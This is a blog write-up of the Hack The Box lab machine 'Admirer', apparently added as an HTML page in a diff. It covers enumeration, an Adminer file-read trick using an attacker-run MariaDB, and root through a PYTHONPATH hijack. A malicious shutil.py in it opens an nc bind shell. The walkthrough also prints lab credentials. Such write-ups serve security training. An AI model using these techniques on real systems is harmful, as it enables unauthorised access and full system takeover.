@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Admirer&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.ab321a2ad61315bebb72e6e3fa1108c4e8ffe4eada5cf5f20131d183a523496246d761df8fc832549be5b9dd47c40509.css" integrity="sha384-qzIaKtYTFb67cubj&#43;hEIxOj/5OraXPXyATHRg6UjSWJG12Hfj8gyVJvlud1HxAUJ"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Admirer" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Admirer</h1><p class="article date">2020-09-26</p></section><article class="article markdown-body"><h1 id="admirer">Admirer</h1>
+<p><img  src="/img/Admirer_Logo.png"
+        alt/></p>
+<p>Admirer is a Linux box that features a vulnerable database setup and leveraging a maliciously crafted python library to achieve root.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>We start off, as always, with an NMAP Scan.</p>
+<pre><code>Nmap scan report for 10.10.10.187
+Host is up (0.12s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>We have FTP, SSH, and an apache web sever to check out.</p>
+<p>We check if FTP has anonymous access enabled. It does not so we are unable to do anything else with this part for now. SSH is also locked down so we move on to the web server.</p>
+<p><img  src="/img/Admirer_HomePage.png"
+        alt="home web page"/></p>
+<p>There isn&rsquo;t much here that we can see right off. We click around a bit but there doesn&rsquo;t seem to be any other pages. There is a contact forum but notes in the code state that it is non functioning. Little can be determined from the pages source code.</p>
+<p>We then take a look at <code>/robots.txt</code></p>
+<p><img  src="/img/Admirer_Robots.png"
+        alt="robots.txt"/></p>
+<p>Ah. It seems the <code>/admin-dir</code>. Might contain some useful info. I would also bet that &ldquo;waldo&rdquo; is a user. This is where the box started to get a bit finicky. There are multiple items you need hidden in here. Tweaking your directory fuzzer ends up pretty important. This is the part of the box I probably lost the most time on.</p>
+<p>There also seemed to be a lot of rabbit holes. Or at least initially Ffuf found almost everything as a redirect.
+However, we eventually find two files.</p>
+<p><strong>/admin-dir/contacts.txt</strong></p>
+<pre><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre><p><strong>/admin-dir/credentials.txt</strong></p>
+<pre><code>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre><h2 id="foothold">Foothold</h2>
+<p>We don&rsquo;t know where the email or a Wordpress site might be. Fortunately, we know of FTP running on port 21. Also fortunately, these credentials allow us to gain access.</p>
+<p><img  src="/img/Admirer_FTPAccess.png"
+        alt="FTP Access"/></p>
+<p>We have a couple things available here. One is a dump of a mysql database, the other is a compressed zip that contains a number of files from the site. We skim through and fine a directory called <code>/utility-scripts</code> that holds a number of php files. We cat these and find what looks like database credentials.</p>
+<p><img  src="/img/Admirer_dbAdminPHP.png"
+        alt="db_admin.php"/></p>
+<p>We don&rsquo;t have a database to use these at though currently. We determine it would probably be wise to check into <code>/utility-scripts</code> with ffuf and see if there is anything else of interest there. This part took tweaking to find the right wordlist. Eventually, dirb&rsquo;s big.txt pulled though.</p>
+<pre><code>.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
+adminer.php             [Status: 200, Size: 4155, Words: 189, Lines: 52]
+info.php                [Status: 200, Size: 83802, Words: 4024, Lines: 962]
+phptest.php             [Status: 200, Size: 32, Words: 8, Lines: 1]
+</code></pre><p>We have seen a couple of these before but <code>adminer.php</code> looks interesting. We navigate there and find a login to access databases. We try to login using the creds from <code>db_admin.php</code> to no avail.</p>
+<p><img  src="/img/Admirer_AdminerLogin.png"
+        alt="AdminerLogin"/></p>
+<p>We return to the old stand by of googling and it pulls through once again. Adminer vulnerability brings up the following article in the first search result.</p>
+<p><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></p>
+<p>In summery, if you have database creds you can use them to access files local to the remote machine by connecting to a database of your own and loading the files into a table. Explanation of this might be a bit rough. Databases are not a strong point.</p>
+<p>I&rsquo;m using Kali which already had mysql installed so we don&rsquo;t need to do installation. Instead we just start the service and start interacting with it.</p>
+<pre><code>sudo systemctl start mysql
+sudo mysql
+</code></pre><p>We then need to create a databases and a table.</p>
+<pre><code>MariaDB [(none)]&gt; create database admirer;
+Query OK, 0 rows affected (0.002 sec)
+
+MariaDB [(none)]&gt; use admirer;
+Query OK, 0 rows affected (0.000 sec)
+
+MariaDB [(none)]&gt; create table temp (data VARCHAR(500));
+Query OK, 0 rows affected (0.001 sec)
+</code></pre><p>Server is listening now we just need to complete a few more steps.</p>
+<p><img  src="/img/Admirer_BindSQL.png"
+        alt/></p>
+<p>We then need to set up a user and grant them remote access to the database. I used this article as a reference point.</p>
+<p><a href="https://webdock.io/en/docs/how-guides/how-enable-remote-access-your-mariadbmysql-database">https://webdock.io/en/docs/how-guides/how-enable-remote-access-your-mariadbmysql-database</a></p>
+<pre><code>MariaDB [(none)]&gt; create user 'admirer'@'localhost' identified by 'password';
+Query OK, 0 rows affected (0.002 sec)
+
+MariaDB [(none)]&gt; grant all on admirer.* to 'admirer'@'10.10.10.187' identified by 'password';
+Query OK, 0 rows affected (0.000 sec)
+
+MariaDB [(none)]&gt;
+</code></pre><p>With this we are able to login to our remote database from Admirer and load files into our table. After a bit we check out <code>index.php</code> and find more creds for Waldo.</p>
+<pre><code>load data local infile '../index.php'
+into table temp
+fields terminated by &quot;/n&quot;
+</code></pre><p><img  src="/img/Admirer_WaldoINdexPHP.png"
+        alt/></p>
+<p>waldo:&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</p>
+<p>We attempt to login with ssh and are successful. Cat user.txt and on to root!</p>
+<h2 id="root">Root</h2>
+<p>Now for root. We copy linpeas to temp but it gets removed part way though enumerating. We get a notification about new mail. It seems that <code>/tmp</code> is getting cleared periodically as are <code>/home/waldo*.p*</code> That makes things a bit more challenging.</p>
+<p><img  src="/img/Admirer_LinPeas.png"
+        alt/></p>
+<p>Rather than switching to a different directory, I decided to check some standard stuff manually, <code>sudo -l</code> for example. It prompts for a password which we enter.</p>
+<p><img  src="/img/Admirer_SudoPerm.png"
+        alt="Sudo Perms"/></p>
+<p>We can see that we can execute a python script <code>/opt/scripts/admin_tasks.sh</code> and we can control the environment for its execution. That&rsquo;s quite interesting. We take a look at the script and can see it is setup to preform a number of &ldquo;administrative&rdquo; functions.</p>
+<p>Option 6, backup_web looks juicy. It runs a python script called <code>backup.py</code> located in the same directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+
+<span style="color:#f92672">from</span> shutil <span style="color:#f92672">import</span> make_archive
+
+src <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/www/html/&#39;</span>
+
+<span style="color:#75715e"># old ftp directory, not used anymore</span>
+<span style="color:#75715e">#dst = &#39;/srv/ftp/html&#39;</span>
+
+dst <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/var/backups/html&#39;</span>
+
+make_archive(dst, <span style="color:#e6db74">&#39;gztar&#39;</span>, src)
+</code></pre></div><p>We can see that it calls a python library. Because we can control the environment we can write and force the use of our own &ldquo;version&rdquo; of shutil. We head over to /tmp and create a <code>shutil.py</code> We then add the following code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;nc -lvp 4444 -e /bin/sh&#34;</span>)
+</code></pre></div><p>We then run the program as root and specify the a python path as our current directory. That means that python will check here first before looking other places to find dependencies.</p>
+<p><code>sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh</code></p>
+<p>Select option 6, and a bind shell opens up we can connect to.</p>
+<p><code>nc 10.10.10.187 4444</code></p>
+<p>Upgrade shell to tty <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> and we are root! Cat the flag and we are done!</p>
+<h2 id="wrap-up">Wrap up</h2>
+<p>Thanks to polarbearer &amp; GibParadox for creating the machine. User was not my favorite but I&rsquo;m just biased cause of lack of comfort working with databases. Root was a very fun privilege escalation though. I would have liked to make it work as a reverse shell but wasn&rsquo;t able to make it work.</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/htb-writeups/blunder-writeup/"><span class="iconfont icon-article"></span>HTB Blunder</a></p><p><a class="link" href="/htb-writeups/tabby-writeup/"><span class="iconfont icon-article"></span>HTB Tabby</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
